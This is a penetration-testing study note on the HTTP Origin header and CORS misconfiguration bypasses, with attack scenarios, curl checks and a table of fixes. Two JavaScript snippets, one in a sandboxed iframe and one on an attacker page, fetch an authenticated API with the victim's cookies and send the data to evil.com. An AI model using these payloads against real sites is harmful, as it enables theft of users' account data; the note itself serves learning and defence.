---
tags: [vapt, http-headers, web, intermediate]
difficulty: intermediate
module: "03 - HTTP Headers"
topic: "03.16 Origin — CORS Bypass"
---

# 03.16 — Origin

## What is it?

The `Origin` header is sent by browsers on cross-origin requests and CORS preflight requests. It tells the server where the request originated (scheme + host + port), without the path. It's less detailed than `Referer` and is more reliable for CORS validation.

---

## How Origin Is Used

```
SAME-ORIGIN REQUEST:
  No Origin header sent (or same as Host)

CROSS-ORIGIN REQUEST (different domain):
  POST /api/transfer HTTP/1.1
  Host: bank.com
  Origin: https://app.bank.com   ← where the request came from

CORS PREFLIGHT:
  OPTIONS /api/data HTTP/1.1
  Host: target.com
  Origin: https://evil.com
  Access-Control-Request-Method: POST
  
  Server responds with CORS policy:
  Access-Control-Allow-Origin: https://trusted.com (or * or null)
```

---

## Attack: CORS Misconfiguration via Origin Manipulation

```
SCENARIO 1: Server reflects Origin header (worst case):
  Request: Origin: https://evil.com
  Response: Access-Control-Allow-Origin: https://evil.com   ← mirrors!
  
  This allows any attacker to read cross-origin responses!

SCENARIO 2: Prefix/suffix matching (weak validation):
  Allowed: target.com
  
  Attack URLs that might pass:
    evil-target.com       ← target.com as suffix
    target.com.evil.com   ← target.com as prefix  
    target.com%60evil.com ← encoding trick
    
SCENARIO 3: Subdomain trust:
  Allowed: *.target.com
  
  If attacker controls any subdomain (XSS or subdomain takeover):
  → Origin: https://xss.target.com
  → Trusted! Read any cross-origin response.

SCENARIO 4: Null origin trust:
  Some apps trust Origin: null
  
  Null origin is sent by:
  - Sandboxed iframes: <iframe sandbox="allow-scripts">
  - data: URIs
  - file:// URLs
  
  Attack:
  <iframe sandbox="allow-scripts allow-top-navigation" srcdoc="
  <script>
    fetch('https://target.com/api/me', {credentials:'include'})
    .then(r => r.text())
    .then(d => fetch('https://evil.com/?d=' + encodeURIComponent(d)))
  </script>">
```

**PortSwigger Labs:** CORS labs (Multiple)

---

## Full CORS Attack Flow

```
1. Victim visits evil.com
2. evil.com runs:
   fetch('https://target.com/api/account', {
     credentials: 'include'  ← include victim's cookies!
   })
   .then(r => r.json())
   .then(data => fetch('https://evil.com/steal?d=' + JSON.stringify(data)))

3. target.com responds:
   Access-Control-Allow-Origin: https://evil.com  ← MISCONFIGURED!
   Access-Control-Allow-Credentials: true
   [sensitive data]

4. Browser allows evil.com to read the response!
5. Victim's account data sent to evil.com!
```

---

## Testing CORS

```bash
# Test if Origin is reflected:
curl -sI https://target.com/api/user \
  -H "Origin: https://evil.com" | grep -i "access-control"
# Access-Control-Allow-Origin: https://evil.com → VULNERABLE!

# Test null origin:
curl -sI https://target.com/api/user \
  -H "Origin: null" | grep -i "access-control"
# Access-Control-Allow-Origin: null → VULNERABLE!

# Test wildcard with credentials:
curl -sI https://target.com/api/user \
  -H "Origin: https://evil.com" | grep -i "allow-credentials"
# Access-Control-Allow-Credentials: true + reflected origin → CRITICAL!

# CORS with BURP SUITE:
# Intercept request → change Origin → forward → check ACAO in response
```

---

## How to Fix / Secure

| Risk | Fix |
|------|-----|
| Reflecting Origin header | Maintain explicit allowlist of trusted origins |
| Trusting null origin | Never trust null origin for authenticated endpoints |
| Wildcard ACAO + credentials | Impossible to combine (browsers enforce this) |
| Subdomain wildcard (*.target.com) | Be very cautious; XSS in any subdomain breaks security |

---

## Related Notes
- [[15 - Referer]] — related header showing source URL
- [[Module 08 - CORS]] — full CORS misconfiguration attack guide
- [[02.28 - Same-Origin Policy]] — SOP that CORS relaxes
